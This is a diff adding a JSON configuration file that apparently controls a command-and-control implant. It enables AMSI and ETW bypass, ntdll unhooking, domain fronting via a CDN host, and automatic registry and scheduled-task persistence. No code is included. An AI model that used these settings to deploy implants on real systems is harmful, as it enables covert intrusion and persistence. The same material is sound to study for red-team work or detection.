@@ -1,0 +1,38 @@
+{
+  "mode": "interactive",
+  "transport": "http",
+  "connection": {
+    "sleep": 0,
+    "jitter": 0.0,
+    "reconnect_delay": 0,
+    "working_hours": null,
+    "keepalive": true
+  },
+  "tls": {
+    "enabled": false
+  },
+  "encryption": {
+    "enabled": false
+  },
+  "evasion": {
+    "auto_bypass": true,
+    "amsi_bypass": true,
+    "etw_bypass": true,
+    "unhook_ntdll": true,
+    "sleep_obfuscation": false,
+    "kill_date": null
+  },
+  "http_profile": "cdn",
+  "domain_front": {
+    "enabled": true,
+    "front_host": "cdn.example.com"
+  },
+  "persistence": {
+    "auto_install": true,
+    "methods": ["registry", "scheduled_task"]
+  },
+  "logging": {
+    "level": "info",
+    "console": true
+  }
+}
